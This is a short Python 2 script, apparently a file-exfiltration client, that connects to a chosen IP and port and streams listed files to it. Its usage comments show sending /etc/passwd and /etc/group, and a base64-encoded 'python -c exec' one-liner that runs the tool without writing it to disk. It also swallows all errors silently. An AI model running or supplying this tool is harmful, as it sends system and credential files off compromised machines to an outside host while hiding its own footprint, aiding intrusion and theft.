#!/usr/bin/env python
#
# Usage 1: python ftclient.py 127.0.0.1 1234 ///etc/passwd /etc/group
# Usage 2: echo python -c \'exec\(\"`cat ftclient.py | base64 | tr -d "\n"`\".decode\(\"base64\"\)\)\' ip port file1 [file2...]
#
import sys,socket
if len(sys.argv)>3:
    for i in sys.argv[3:]:
        try:
            s=socket.socket()
            s.connect((sys.argv[1],int(sys.argv[2]),))
            print 'uploading',i,'...',
            c=s.recv(1024)
            if c=='h':
                s.sendall(i)
            c=s.recv(1024)
            if c=='b':
                with open(i,'rb') as f:
                    while True:
                        x=f.read(1024)
                        if x:
                            s.send(x)
                        else:
                            break
                print 'done'
        except:
            pass
